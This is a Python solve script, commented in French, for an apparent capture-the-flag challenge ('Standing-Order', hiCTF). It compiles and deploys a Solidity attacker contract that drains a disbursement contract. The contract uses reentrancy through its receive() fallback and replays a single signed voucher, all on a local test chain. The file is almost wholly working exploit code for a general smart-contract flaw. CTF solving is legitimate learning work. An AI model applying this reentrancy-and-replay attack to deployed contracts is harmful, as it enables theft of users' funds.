# Standing-Order — hiCTF (script de solve)
import solcx, os
from web3 import Web3
from eth_account.messages import encode_defunct
from eth_tester import EthereumTester, PyEVMBackend
from web3.providers.eth_tester import EthereumTesterProvider
solcx.set_solc_version("0.8.24")
CDIR="standing/standing-order/contracts"
SRC={f:open(os.path.join(CDIR,f)).read() for f in os.listdir(CDIR)}
# Attacker contract (réentrance sur disburse)
SRC["Attack.sol"]='''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
interface IDis {
  function disburse(address recipient, uint256 amount, uint256 nonce, bytes calldata sig) external;
}
contract Attack {
  IDis public d; address public owner;
  uint256 amount; uint256 nonce; bytes sig;
  constructor(address _d){ d=IDis(_d); owner=msg.sender; }
  function go(uint256 _a,uint256 _n,bytes calldata _s) external {
    amount=_a; nonce=_n; sig=_s;
    d.disburse(address(this), amount, nonce, sig);
    (bool ok,)=owner.call{value:address(this).balance}(""); require(ok,"fwd");
  }
  receive() external payable {
    if (address(d).balance >= amount) d.disburse(address(this), amount, nonce, sig);
  }
}'''
inp={"language":"Solidity","sources":{k:{"content":v} for k,v in SRC.items()},
 "settings":{"optimizer":{"enabled":True,"runs":200},"evmVersion":"cancun",
  "outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
comp=solcx.compile_standard(inp,allow_paths=".")
def get(f,c): x=comp["contracts"][f][c]; return x["abi"],x["evm"]["bytecode"]["object"]

# backend avec comptes bien financés (besoin de 20 ETH pour le reserve)
from eth_tester import PyEVMBackend
backend=PyEVMBackend.from_mnemonic("test test test test test test test test test test test junk",
                                   genesis_state_overrides={"balance": Web3.to_wei(1000,"ether")})
t=EthereumTester(backend=backend); w3=Web3(EthereumTesterProvider(t))
dep=w3.eth.accounts[0]; player=w3.eth.accounts[1]; w3.eth.default_account=dep
# committee = clé éphémère (en live : fournie, sig lue sur Setup)
committee=w3.eth.account.create()
# sign voucher (amount=1 ETH, nonce=0) : ethSigned = EIP-191 personal_sign du digest
amount=Web3.to_wei(1,"ether"); nonce=0
digest=Web3.solidity_keccak(["uint256","uint256"],[amount,nonce])
signed=w3.eth.account.sign_message(encode_defunct(primitive=digest), committee.key)
sig=signed.signature
print("committee:",committee.address)

def deploy(f,c,*a,value=0,sender=dep):
    abi,bc=get(f,c); C=w3.eth.contract(abi=abi,bytecode=bc)
    tx=C.constructor(*a).transact({"from":sender,"value":value})
    r=w3.eth.wait_for_transaction_receipt(tx)
    return w3.eth.contract(address=r.contractAddress,abi=abi),r.contractAddress

setup,setup_addr=deploy("Setup.sol","Setup", player, committee.address, sig, value=Web3.to_wei(20,"ether"))
dis_addr=setup.functions.disbursement().call()
print("disbursement:",dis_addr,"balance start:",Web3.from_wei(w3.eth.get_balance(dis_addr),"ether"),"ETH")
print("isSolved start:", setup.functions.isSolved().call())

# déployer l'attaquant (par le player) et lancer
atk,atk_addr=deploy("Attack.sol","Attack", dis_addr, sender=player)
tx=atk.functions.go(amount,nonce,sig).transact({"from":player})
w3.eth.wait_for_transaction_receipt(tx)
print("disbursement balance after:",Web3.from_wei(w3.eth.get_balance(dis_addr),"ether"),"ETH")
print("attacker(owner=player) gained ~", Web3.from_wei(w3.eth.get_balance(player),"ether"),"ETH (player)")
print(">>> isSolved():", setup.functions.isSolved().call())
